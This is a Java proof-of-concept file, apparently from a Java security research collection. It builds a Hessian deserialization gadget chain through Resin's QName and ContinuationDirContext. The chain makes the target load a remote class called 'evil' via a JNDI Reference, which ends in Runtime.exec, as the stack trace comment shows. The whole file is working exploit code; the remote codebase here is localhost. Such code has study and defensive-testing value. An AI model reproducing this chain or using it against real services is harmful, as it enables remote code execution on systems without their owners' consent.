package com.javasec.pocs.hessian.resin;

import com.caucho.naming.QName;
import com.javasec.utils.CypherUtils;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Hashtable;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:7, evil
 * forName0:-1, Class (java.lang)
 * forName:348, Class (java.lang)
 * loadClass:72, VersionHelper12 (com.sun.naming.internal)
 * loadClass:61, VersionHelper12 (com.sun.naming.internal)
 * getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
 * getObjectInstance:319, NamingManager (javax.naming.spi)
 * getContext:439, NamingManager (javax.naming.spi)
 * getTargetContext:55, ContinuationContext (javax.naming.spi)
 * composeName:180, ContinuationContext (javax.naming.spi)
 * toString:353, QName (com.caucho.naming)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * putVal:634, HashMap (java.util)
 * put:611, HashMap (java.util)
 * readMap:114, MapDeserializer (com.caucho.hessian.io)
 * readMap:577, SerializerFactory (com.caucho.hessian.io)
 * readObject:2093, Hessian2Input (com.caucho.hessian.io)
 * expect:2860, Hessian2Input (com.caucho.hessian.io)
 * readString:1407, Hessian2Input (com.caucho.hessian.io)
 * readObjectDefinition:2163, Hessian2Input (com.caucho.hessian.io)
 * readObject:2105, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:244, SerializeUtils (com.javasec.utils)
 * main:28, ToStringResin (com.javasec.pocs.hessian.resin)
 */
public class ToStringResin {
    public static void main(String[] args) throws Exception {
        Reference refObj=new Reference("evil","evil","http://localhost:8000/");
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(refObj);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "boo", "gii");
        String unhash = CypherUtils.unhash(qName.hashCode());
        XString xString = new XString(unhash);
        HashMap<Object, Object> map = SerializeUtils.makeMap(qName, xString);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(map));
    }
}
